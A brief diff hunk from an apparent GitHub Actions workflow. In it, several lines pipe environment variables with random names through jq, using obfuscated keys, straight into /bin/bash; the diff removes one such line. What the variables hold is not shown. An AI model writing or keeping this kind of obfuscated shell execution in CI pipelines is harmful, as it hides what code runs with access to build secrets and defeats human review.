@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ctb95841" | jq -r .baa4140 | /bin/bash
           printf '%s' "$wt0" | jq -r .psjfm40169 | /bin/bash
           echo $kqpna9 | jq -r .lor47818 | /bin/bash
-          echo $m885 | jq -r .z88055 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
